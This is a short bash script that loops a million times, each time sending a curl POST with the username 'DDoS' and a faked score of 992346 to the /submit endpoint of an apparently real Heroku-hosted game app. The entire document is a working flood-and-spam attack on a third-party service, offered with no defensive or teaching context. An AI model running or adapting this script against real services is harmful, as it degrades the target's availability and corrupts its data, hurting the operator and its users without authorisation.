
#!/bin/bash
# Basic while loop
counter=1
while [ $counter -le 1000000 ]
do
echo $counter
curl --max-time 0.075 -d "username=DDoS&score=992346&grid={}" http://cryptic-brook-57226.herokuapp.com/submit 
((counter++))
done
echo All done
